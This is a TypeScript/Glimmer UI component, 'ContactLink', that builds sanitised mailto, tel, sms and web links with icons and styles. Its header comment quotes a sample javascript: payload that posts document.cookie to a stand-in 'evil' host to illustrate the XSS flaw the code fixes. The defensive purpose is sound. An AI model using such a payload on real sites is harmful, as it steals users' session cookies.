// Pretui — ContactLink: a contact detail rendered as a safe, typed link with its channel glyph.
//
// A contact detail is two facts, and most components carry only one: WHAT it
// is (an address, a number, a profile) and WHAT YOU DO WITH IT (write, call,
// text, visit). A phone number rendered as text makes the reader copy it into
// something else; a bare `<a>` with no verb makes them guess where it goes.
// This carries both, plus the one thing a contact link absolutely must have
// and the source did not: a sanitised href.
//
// ── The security fix, stated plainly ────────────────────────────────────
//
// The source pasted its stored value straight into an `href`, so a value of
// `javascript:fetch('//evil', {method:'POST', body:document.cookie})` became a
// working link the moment anyone clicked it. Every href here is BUILT rather
// than passed through: the value is validated against the channel's own shape,
// and for the URL channels it goes through `new URL()` and an explicit
// http/https allowlist. A value that does not resolve renders as plain text
// with a quiet note — never as a link that goes somewhere unexpected, and
// never as nothing at all, which is the source's other failure mode.
//
// ── Better than the inspiration ─────────────────────────────────────────
//
// The source's genuinely good idea was a table pairing a type with its label,
// icon, verb and URL scheme, so the set could grow without touching templates.
// It then looked entries up by their HUMAN-READABLE LABEL, so renaming
// "Phone" to "Telephone" — or translating it — silently broke the icon, the
// verb and the scheme all at once, and a miss rendered nothing at all.
//
// Here the table is keyed by a stable id, and `@channel` also accepts a whole
// `ContactChannel` object, so a caller adds LinkedIn or Discord by passing
// data rather than by subclassing. It is the same extensibility, reachable
// without inheritance.
import Component from '@glimmer/component';
import { cssStyle } from '../pretui-css';

// ═══════════════════════════════════════════════════════════════════════
// The pure layer. No DOM, no clock.
// Unit-tested in ink-contact.test.gts
// ═══════════════════════════════════════════════════════════════════════

/** Which mark is drawn. Inline SVG in `currentColor` rather than a registry
 * lookup, so a channel a caller invents still gets a mark. */
export type ContactGlyph = 'mail' | 'phone' | 'chat' | 'globe' | 'at';

/** One kind of contact detail. Everything a channel needs is data, so a
 * caller can add one without touching this module. */
export interface ContactChannel {
  /** stable key — never the visible label, which renaming or translating
   * would break */
  id: string;
  /** what the channel is called */
  label: string;
  /** what you DO with it: Email, Call, Text, Visit */
  cta: string;
  /** the URI scheme, or `''` when the value is already a whole URL */
  scheme: '' | 'mailto:' | 'tel:' | 'sms:';
  /** for a handle channel, the profile base — `https://github.com/` */
  base?: string;
  glyph: ContactGlyph;
  /** opens in a new context; false for `mailto:`/`tel:`, which hand off to
   * the OS rather than navigating */
  external?: boolean;
}

/** The channels that are generic enough to ship. Anything more specific is a
 * `ContactChannel` the caller passes in. */
export const CONTACT_CHANNELS: Record<string, ContactChannel> = {
  email: {
    id: 'email',
    label: 'Email',
    cta: 'Email',
    scheme: 'mailto:',
    glyph: 'mail',
  },
  phone: {
    id: 'phone',
    label: 'Phone',
    cta: 'Call',
    scheme: 'tel:',
    glyph: 'phone',
  },
  sms: {
    id: 'sms',
    label: 'Text message',
    cta: 'Text',
    scheme: 'sms:',
    glyph: 'chat',
  },
  url: {
    id: 'url',
    label: 'Website',
    cta: 'Visit',
    scheme: '',
    glyph: 'globe',
    external: true,
  },
};

/** The only schemes a built href may end up carrying. Everything else —
 * `javascript:`, `data:`, `vbscript:`, `file:` — is refused. */
const SAFE_PROTOCOLS = ['http:', 'https:'];

/**
 * Deliberately conservative rather than RFC-complete.
 *
 * A validator that accepts every legal address also accepts a great deal that
 * is not an address at all, and the cost of a false negative here is a link
 * that renders as text with a note — recoverable. The cost of a false positive
 * is an `href` nobody checked.
 */
const EMAIL_SHAPE = /^[^\s@<>"'\\]+@[^\s@<>"'\\.]+(?:\.[^\s@<>"'\\.]+)+$/;
const HANDLE_SHAPE = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/;

/** Resolve `@channel` — an id or a whole channel — to a channel. */
export function channelFor(
  channel: string | ContactChannel | undefined,
): ContactChannel | undefined {
  if (channel === undefined) {
    return undefined;
  }
  if (typeof channel === 'string') {
    return CONTACT_CHANNELS[channel.trim().toLowerCase()];
  }
  return channel;
}

/** A URL, only if it is one AND it is http or https. `new URL` does the
 * parsing so no hand-rolled scheme regex has to be right. */
function safeUrl(text: string): string | undefined {
  let raw = text.trim();
  if (raw.length === 0) {
    return undefined;
  }
  // A URL contains no raw whitespace — a legitimate one percent-encodes it —
  // and browsers are more forgiving here than the spec suggests: Chromium
  // happily parses `https://not a url at all` rather than throwing, so a
  // sentence would otherwise become a link. Measured, not assumed.
  if (/\s/.test(raw)) {
    return undefined;
  }
  // A bare host is a URL a reader clearly meant; a bare `javascript:...` is
  // not, and prefixing it would only hide it. So the prefix is added only when
  // there is no scheme-looking prefix at all.
  let candidate = /^[A-Za-z][A-Za-z0-9+.-]*:/.test(raw) ? raw : 'https://' + raw;
  let parsed: URL;
  try {
    parsed = new URL(candidate);
  } catch {
    return undefined;
  }
  if (SAFE_PROTOCOLS.indexOf(parsed.protocol) === -1) {
    return undefined;
  }
  // A contact link points at somewhere on the public web, so the host has to
  // look like one. Named rather than hidden (Law 7): a single-label intranet
  // host (`https://wiki`) is deliberately refused, because accepting it also
  // accepts every typo that happens to parse.
  let host = parsed.hostname;
  if (host.length === 0 || (host.indexOf('.') === -1 && host !== 'localhost')) {
    return undefined;
  }
  return parsed.href;
}

/**
 * The `href` for a value on a channel, or `undefined`.
 *
 * Always BUILT, never passed through: the caller's characters are validated
 * against the channel's shape first, and for the URL channels the result is
 * re-serialised by the platform's own parser. There is no path by which an
 * unvalidated string reaches an `href`.
 */
export function contactHref(
  channel: ContactChannel | undefined,
  value: string | undefined,
): string | undefined {
  if (!channel) {
    return undefined;
  }
  let raw = (value ?? '').trim();
  if (raw.length === 0) {
    return undefined;
  }

  if (channel.base) {
    let handle = raw.replace(/^@/, '');
    if (!HANDLE_SHAPE.test(handle)) {
      return undefined;
    }
    return safeUrl(channel.base + handle);
  }

  if (channel.scheme === 'mailto:') {
    let address = raw.replace(/^mailto:/i, '').trim();
    return EMAIL_SHAPE.test(address)
      ? 'mailto:' + encodeURIComponent(address).replace(/%40/g, '@')
      : undefined;
  }

  if (channel.scheme === 'tel:' || channel.scheme === 'sms:') {
    let typed = raw.replace(/^(tel|sms):/i, '').trim();
    // A phone number contains digits and the punctuation people write them
    // with — nothing else. Checking the WHOLE value before stripping is what
    // stops an arbitrary string with a few digits in it (a base64 blob, a
    // sentence) from being harvested into a plausible-looking `tel:`.
    if (!/^[+()\-./\s\d]+$/.test(typed)) {
      return undefined;
    }
    // Rebuilt from digits and a single leading plus. Nothing else survives, so
    // a number cannot smuggle a second URI component past the dialler.
    let digits = typed.replace(/[^\d+]/g, '');
    let plus = digits.startsWith('+') ? '+' : '';
    let body = digits.replace(/\+/g, '');
    if (body.length < 3 || body.length > 20) {
      return undefined;
    }
    return channel.scheme + plus + body;
  }

  return safeUrl(raw);
}

/**
 * The value as a reader wants to see it — a host without its scheme, a handle
 * with its `@`, an address as typed.
 *
 * Never used to build the href; a display string and a destination are
 * different things and conflating them is how a link ends up going somewhere
 * other than what it says.
 */
export function contactDisplay(
  channel: ContactChannel | undefined,
  value: string | undefined,
): string {
  let raw = (value ?? '').trim();
  if (!channel || raw.length === 0) {
    return raw;
  }
  if (channel.base) {
    return '@' + raw.replace(/^@/, '');
  }
  if (channel.scheme === '') {
    let href = safeUrl(raw);
    if (!href) {
      return raw;
    }
    try {
      let parsed = new URL(href);
      let path = parsed.pathname === '/' ? '' : parsed.pathname;
      return parsed.hostname.replace(/^www\./, '') + path;
    } catch {
      return raw;
    }
  }
  return raw.replace(/^(mailto|tel|sms):/i, '');
}

/** A profile channel from a base URL — the extension point, as data. */
export function handleChannel(
  id: string,
  label: string,
  base: string,
  cta = 'Visit',
): ContactChannel {
  return { id, label, cta, scheme: '', base, glyph: 'at', external: true };
}

// ═══════════════════════════════════════════════════════════════════════
// The component
// ═══════════════════════════════════════════════════════════════════════

export interface ContactLinkSignature {
  Args: {
    /** a channel id (`email`, `phone`, `sms`, `url`) or a whole
     * `ContactChannel` — passing data is how the set grows */
    channel?: string | ContactChannel;
    /** the address, number, handle or URL */
    value?: string;
    /** who or what it belongs to; joins the accessible name so a row of
     * these does not announce as four identical "Email" links */
    name?: string;
    /** `chip` (default) is an inline pill; `row` is a full-width line with the
     * verb at the end; `icon` is the mark alone with an sr-only name */
    variant?: 'chip' | 'row' | 'icon';
    /** show the verb beside the value in the chip variant */
    showCta?: boolean;
    /** a hue for the Law-2 treatment; defaults to the theme accent */
    hue?: string;
  };
  Element: HTMLElement;
}

export class ContactLink extends Component<ContactLinkSignature> {
  get channel(): ContactChannel | undefined {
    return channelFor(this.args.channel);
  }

  get href(): string | undefined {
    return contactHref(this.channel, this.args.value);
  }

  get resolves(): boolean {
    return this.href !== undefined;
  }

  get display(): string {
    return contactDisplay(this.channel, this.args.value);
  }

  get variant(): 'chip' | 'row' | 'icon' {
    return this.args.variant ?? 'chip';
  }

  get isRow(): boolean {
    return this.variant === 'row';
  }
  get isIconOnly(): boolean {
    return this.variant === 'icon';
  }

  get cta(): string {
    return this.channel?.cta ?? 'Open';
  }

  get external(): boolean {
    return this.channel?.external === true;
  }
  get target(): string | undefined {
    return this.external ? '_blank' : undefined;
  }
  /** `noopener` matters even on a `mailto:`-adjacent link: a caller can supply
   * any channel, and a rule that only sometimes applies is a rule that will be
   * missed. */
  get rel(): string | undefined {
    return this.external ? 'noopener noreferrer' : undefined;
  }

  /**
   * The accessible name, composed rather than left to fall out of the
   * subtree.
   *
   * A row of four contact links whose names are all "Email" is a screen-reader
   * failure that looks fine on screen, so the name always carries the verb,
   * the value and — where the caller supplied one — who it belongs to.
   */
  get accessibleName(): string {
    let parts = [this.cta];
    if (this.args.name) {
      parts.push(this.args.name);
    }
    if (this.display) {
      parts.push('at ' + this.display);
    }
    return parts.join(' ');
  }

  get unresolvedNote(): string {
    let label = this.channel?.label ?? 'contact';
    return 'Not a usable ' + label.toLowerCase() + ', so it is shown as text.';
  }

  /** The caller hue, validated before it reaches a style attribute. A colour
   * is the one caller value that goes straight into CSS, so it never goes
   * there unguarded. */
  get hueStyle() {
    return cssStyle('--pretui-contact-hue', this.args.hue);
  }

  get glyph(): ContactGlyph {
    return this.channel?.glyph ?? 'globe';
  }
  get isMail(): boolean {
    return this.glyph === 'mail';
  }
  get isPhone(): boolean {
    return this.glyph === 'phone';
  }
  get isChat(): boolean {
    return this.glyph === 'chat';
  }
  get isAt(): boolean {
    return this.glyph === 'at';
  }
  get isGlobe(): boolean {
    return !this.isMail && !this.isPhone && !this.isChat && !this.isAt;
  }

  <template>
    {{#if this.resolves}}
      <a
        class='pretui-contact'
        href={{this.href}}
        target={{this.target}}
        rel={{this.rel}}
        data-variant={{this.variant}}
        data-channel={{this.channel.id}}
        aria-label={{this.accessibleName}}
        style={{this.hueStyle}}
        data-test-pretui-contact
        ...attributes
      >
        <span class='pretui-contact-mark' aria-hidden='true'>
          {{#if this.isMail}}
            <svg viewBox='0 0 16 16' width='13' height='13' fill='none'>
              <rect
                x='1.5'
                y='3.5'
                width='13'
                height='9'
                rx='1.5'
                stroke='currentColor'
                stroke-width='1.3'
              /><path
                d='M2 4.5 8 9l6-4.5'
                stroke='currentColor'
                stroke-width='1.3'
                stroke-linecap='round'
                stroke-linejoin='round'
              />
            </svg>
          {{else if this.isPhone}}
            <svg viewBox='0 0 16 16' width='13' height='13' fill='none'>
              <path
                d='M3 2.5h2.2l1.1 2.8-1.4 1a8 8 0 0 0 3.8 3.8l1-1.4 2.8 1.1V12a1.5 1.5 0 0 1-1.6 1.5A10.5 10.5 0 0 1 1.5 4.1 1.5 1.5 0 0 1 3 2.5Z'
                stroke='currentColor'
                stroke-width='1.3'
                stroke-linejoin='round'
              />
            </svg>
          {{else if this.isChat}}
            <svg viewBox='0 0 16 16' width='13' height='13' fill='none'>
              <path
                d='M2 4.5A2 2 0 0 1 4 2.5h8a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2H6.5L3 13.2V10.5H4a2 2 0 0 1-2-2Z'
                stroke='currentColor'
                stroke-width='1.3'
                stroke-linejoin='round'
              />
            </svg>
          {{else if this.isAt}}
            <svg viewBox='0 0 16 16' width='13' height='13' fill='none'>
              <circle
                cx='8'
                cy='8'
                r='2.6'
                stroke='currentColor'
                stroke-width='1.3'
              /><path
                d='M10.6 5.4v3.4a1.9 1.9 0 0 0 3.4 1 6.2 6.2 0 1 0-2.4 3.3'
                stroke='currentColor'
                stroke-width='1.3'
                stroke-linecap='round'
              />
            </svg>
          {{else}}
            <svg viewBox='0 0 16 16' width='13' height='13' fill='none'>
              <circle
                cx='8'
                cy='8'
                r='6'
                stroke='currentColor'
                stroke-width='1.3'
              /><path
                d='M2 8h12M8 2a11 11 0 0 1 0 12A11 11 0 0 1 8 2Z'
                stroke='currentColor'
                stroke-width='1.3'
              />
            </svg>
          {{/if}}
        </span>
        {{#unless this.isIconOnly}}
          <span class='pretui-contact-value'>{{this.display}}</span>
          {{#if this.isRow}}
            <span class='pretui-contact-cta'>{{this.cta}}</span>
          {{else if @showCta}}
            <span class='pretui-contact-cta'>{{this.cta}}</span>
          {{/if}}
        {{/unless}}
      </a>
    {{else}}
      {{! Never a dead <a>, and never nothing: a value that cannot be turned
          into a safe destination is still information the reader wants. }}
      <span
        class='pretui-contact'
        data-variant={{this.variant}}
        data-unresolved='true'
        data-test-pretui-contact
        ...attributes
      >
        <span class='pretui-contact-value'>{{this.display}}</span>
        <span class='pretui-contact-note'>{{this.unresolvedNote}}</span>
      </span>
    {{/if}}
    <style scoped>
      @layer PretComponent {
        /* Law 2 — one hue in, a complete treatment out. The ink is derived from
           the same hue rather than picked, so contrast holds in light and dark
           and any caller hue stays legible. */
        .pretui-contact {
          --hue: var(--pretui-contact-hue, var(--primary));
          display: inline-flex;
          align-items: center;
          gap: var(--space-2, 6px);
          min-width: 0;
          max-width: 100%;
          padding: 3px calc(6px * var(--pretui-capsule-base, 1.35));
          border-radius: var(--radius);
          background: color-mix(in oklch, var(--hue) 12%, var(--card));
          color: color-mix(in oklch, var(--foreground) 16%, var(--hue));
          font-size: var(--text-ui-sm, 11.5px);
          text-decoration: none;
          transition:
            background-color 140ms
              var(--pretui-ease-snap, cubic-bezier(0.23, 1, 0.32, 1)),
            transform 140ms var(--pretui-ease-snap, cubic-bezier(0.23, 1, 0.32, 1));
        }
        a.pretui-contact:hover {
          background: color-mix(in oklch, var(--hue) 20%, var(--card));
        }
        /* One consistent press across everything pressable. */
        a.pretui-contact:active {
          transform: scale(0.96);
        }
        a.pretui-contact:focus-visible {
          outline: 2px solid var(--ring);
          outline-offset: 2px;
        }
        .pretui-contact[data-unresolved='true'] {
          --hue: var(--muted-foreground);
          flex-wrap: wrap;
        }
        .pretui-contact-mark {
          flex: 0 0 auto;
          display: inline-flex;
        }
        /* Min-width: 0 plus truncation on every flex child, or a
           long address blows the row out. */
        .pretui-contact-value {
          min-width: 0;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
        }
        .pretui-contact-cta {
          flex: 0 0 auto;
          font-weight: var(--weight-medium, 500);
          opacity: 0.75;
        }
        .pretui-contact-note {
          flex: 0 0 auto;
          font-size: var(--text-ui-xs, 10.5px);
          color: var(--muted-foreground);
        }
        .pretui-contact[data-variant='row'] {
          display: flex;
          width: 100%;
          padding: var(--space-2, 6px) var(--space-3, 8px);
          font-size: var(--text-ui-md, 13px);
        }
        .pretui-contact[data-variant='row'] .pretui-contact-cta {
          margin-inline-start: auto;
        }
        .pretui-contact[data-variant='icon'] {
          padding: 5px;
          border-radius: 999px;
        }
        @media (pointer: coarse) {
          .pretui-contact[data-variant='icon'],
          .pretui-contact[data-variant='row'] {
            min-height: 44px;
          }
        }
        @media (prefers-reduced-motion: reduce) {
          .pretui-contact {
            transition: none;
          }
          a.pretui-contact:active {
            transform: none;
          }
        }
      }
    </style>
  </template>
}
